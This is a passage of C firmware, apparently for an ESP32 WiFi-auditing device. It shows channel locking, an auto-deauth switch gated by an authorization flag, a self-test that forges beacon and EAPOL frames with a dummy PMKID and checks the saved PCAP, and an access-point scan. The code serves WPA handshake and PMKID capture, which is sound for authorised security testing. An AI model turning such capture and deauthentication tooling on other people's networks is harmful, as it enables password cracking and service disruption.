        s_stats.channel = channel;
        s_stats.band = channel >= 36 ? 5 : 2;
        event("manual channel %u", channel);
    }
    return err;
}

void pwn_wifi_set_locked(bool locked, uint8_t channel)
{
    if (locked) {
        s_locked = true;
        if (channel) {
            esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                esp_wifi_set_band(channel >= 36 ? WIFI_BAND_5G : WIFI_BAND_2G);
                err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            }
            /*
             * While associated the STA owns the radio and set_channel() can
             * fail with "STA is scanning or connecting".  The hardware is
             * already on the AP channel, so trust the association and keep
             * the UI/status in sync either way.
             */
            s_stats.channel = channel;
            s_stats.band = channel >= 36 ? 5 : 2;
            event("locked to AP channel %u", channel);
        }
    } else if (s_locked) {
        s_locked = false;
        s_chan_idx = 0;
        event("hopping resumed");
    }
}

bool pwn_wifi_locked(void)
{
    return s_locked;
}

void pwn_wifi_set_auto_deauth(bool on)
{
    s_auto_deauth = on && s_authorized;
    ESP_LOGW(TAG, "auto-deauth %s", s_auto_deauth ? "ON" : "off");
}

bool pwn_wifi_auto_deauth(void)
{
    return s_auto_deauth;
}

/* ---- built-in self test ---------------------------------------------- */

static int build_eapol(uint8_t *buf, bool from_ap, const uint8_t *bssid,
                       const uint8_t *sta, uint16_t key_info,
                       const uint8_t *pmkid)
{
    memset(buf, 0, PWN_FRAME_MAX);

    buf[0] = 0x08;                    /* data */
    buf[1] = from_ap ? 0x02 : 0x01;   /* FromDS / ToDS */
    if (from_ap) {
        memcpy(buf + 4, sta, 6);
        memcpy(buf + 10, bssid, 6);
        memcpy(buf + 16, bssid, 6);
    } else {
        memcpy(buf + 4, bssid, 6);
        memcpy(buf + 10, sta, 6);
        memcpy(buf + 16, bssid, 6);
    }

    int o = 24;
    static const uint8_t llc[8] = {0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e};
    memcpy(buf + o, llc, 8);
    o += 8;

    int kdlen = pmkid ? 22 : 0;
    buf[o + 0] = 0x02;                /* EAPOL version */
    buf[o + 1] = 0x03;                /* EAPOL-Key */
    buf[o + 2] = (uint8_t)(((95 + kdlen) >> 8) & 0xff);
    buf[o + 3] = (uint8_t)((95 + kdlen) & 0xff);

    uint8_t *body = buf + o + 4;
    body[0] = 0x02;                   /* RSN key descriptor */
    body[1] = (uint8_t)((key_info >> 8) & 0xff);
    body[2] = (uint8_t)(key_info & 0xff);
    body[3] = 0x00;
    body[4] = 0x10;                   /* key length 16 */
    body[12] = 0x01;                  /* replay counter */
    for (int i = 0; i < 32; i++) {
        body[13 + i] = 0x11;
    }
    if (key_info & 0x0100) {
        for (int i = 0; i < 16; i++) {
            body[77 + i] = 0x5a;      /* MIC */
        }
    }
    body[93] = (uint8_t)((kdlen >> 8) & 0xff);
    body[94] = (uint8_t)(kdlen & 0xff);
    if (pmkid) {
        uint8_t *kd = body + 95;
        kd[0] = 0xdd;
        kd[1] = 20;                   /* OUI(3) + type(1) + pmkid(16) */
        kd[2] = 0x00;
        kd[3] = 0x0f;
        kd[4] = 0xac;
        kd[5] = 0x04;
        memcpy(kd + 6, pmkid, 16);
    }

    return 24 + 8 + 4 + 95 + kdlen;
}

int pwn_wifi_selftest(void)
{
    static uint8_t frame[PWN_FRAME_MAX];
    const uint8_t bssid[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    const uint8_t sta[6]   = {0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xee};
    const uint8_t pmkid[16] = {
        0xde, 0xad, 0xbe, 0xef, 0x01, 0x02, 0x03, 0x04,
        0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c,
    };
    const char *ssid = "PWNI-TEST";

    /* Beacon so the parser can attach an SSID to the BSSID. */
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x80;                  /* beacon */
    memset(frame + 4, 0xff, 6);       /* broadcast */
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    frame[32] = 0x64;                 /* beacon interval */
    frame[34] = 0x11;                 /* capability: ESS + privacy */
    int o = 36;
    frame[o++] = 0;                   /* SSID */
    frame[o++] = (uint8_t)strlen(ssid);
    memcpy(frame + o, ssid, strlen(ssid));
    o += strlen(ssid);
    frame[o++] = 3;                   /* DS parameter */
    frame[o++] = 1;
    frame[o++] = 6;
    frame[o++] = 48;                  /* RSN */
    frame[o++] = 2;
    frame[o++] = 0x01;
    frame[o++] = 0x00;
    process_frame(frame, o, -40, 6);

    /* M1 with PMKID, then M2. */
    int len = build_eapol(frame, true, bssid, sta, 0x0088, pmkid);
    process_frame(frame, len, -40, 6);
    len = build_eapol(frame, false, bssid, sta, 0x0108, NULL);
    process_frame(frame, len, -40, 6);

    capture_flush_all();

    uint32_t hs = capture_handshake_count();
    uint32_t pk = capture_pmkid_count();
    ESP_LOGI(TAG, "selftest: hs=%u pmkid=%u saved=%u",
             (unsigned)hs, (unsigned)pk, (unsigned)capture_saved_count());

    if (!capture_sd_ready()) {
        ESP_LOGW(TAG, "selftest: no SD card, skipping PCAP check");
        return hs > 0 ? 0 : -1;
    }

    char name[96];
    char path[160];
    if (!capture_file_for(bssid, sta, name, sizeof(name))) {
        ESP_LOGE(TAG, "selftest: slot has no saved PCAP");
        return -2;
    }
    snprintf(path, sizeof(path), PWN_HS_DIR "/%s", name);
    if (!capture_bus_lock(portMAX_DELAY)) {
        ESP_LOGE(TAG, "selftest: display lock unavailable");
        return -5;
    }
    FILE *f = fopen(path, "rb");
    if (!f) {
        capture_bus_unlock();
        ESP_LOGE(TAG, "selftest: cannot open %s", path);
        return -2;
    }
    uint8_t hdr[24];
    size_t got = fread(hdr, 1, sizeof(hdr), f);
    uint32_t magic = 0, linktype = 0;
    memcpy(&magic, hdr, 4);
    memcpy(&linktype, hdr + 20, 4);

    int packets = 0;
    uint8_t ph[16];
    while (fread(ph, 1, sizeof(ph), f) == sizeof(ph)) {
        uint32_t incl = 0;
        memcpy(&incl, ph + 8, 4);
        if (incl == 0 || incl > 2048) {
            break;
        }
        fseek(f, incl, SEEK_CUR);
        packets++;
    }
    fclose(f);
    capture_bus_unlock();

    if (got != 24 || magic != 0xa1b2c3d4 || linktype != 127) {
        ESP_LOGE(TAG, "selftest: bad pcap magic=%08x link=%u",
                 (unsigned)magic, (unsigned)linktype);
        return -3;
    }
    ESP_LOGI(TAG, "selftest OK: %s, %d packets, linktype 127", path, packets);
    return packets > 0 ? 0 : -4;
}

int pwn_wifi_scan_now(void)
{
    wifi_scan_config_t scan = {
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    };
    if (esp_wifi_scan_start(&scan, true) != ESP_OK) {
        return -1;
    }

    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    if (num > 32) num = 32;
    wifi_ap_record_t *recs = calloc(num ? num : 1, sizeof(wifi_ap_record_t));
    if (!recs) {
        return -1;
    }
    uint16_t got = num;
    esp_wifi_scan_get_ap_records(&got, recs);

    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    for (int i = 0; i < got; i++) {
        pwn_ap_t *ap = ap_upsert(recs[i].bssid);
        if (!ap) continue;
        snprintf(ap->ssid, sizeof(ap->ssid), "%s", (const char *)recs[i].ssid);
        ap->channel = recs[i].primary;
        ap->rssi = recs[i].rssi;
        ap->last_seen_ms = now_ms();
        ap->wps = recs[i].wps;
        switch (recs[i].authmode) {
        case WIFI_AUTH_OPEN: ap->security = SEC_OPEN; break;
        case WIFI_AUTH_WEP:  ap->security = SEC_WEP; break;
        case WIFI_AUTH_WPA_PSK: ap->security = SEC_WPA; break;
        case WIFI_AUTH_WPA2_PSK:
        case WIFI_AUTH_WPA_WPA2_PSK: ap->security = SEC_WPA2; break;
        case WIFI_AUTH_WPA3_PSK:
        case WIFI_AUTH_WPA2_WPA3_PSK: ap->security = SEC_WPA3; break;
        default: ap->security = SEC_UNKNOWN; break;
        }
    }
    xSemaphoreGive(s_tab_lock);
    free(recs);
    event("scan found %u APs", got);
    return got;
}
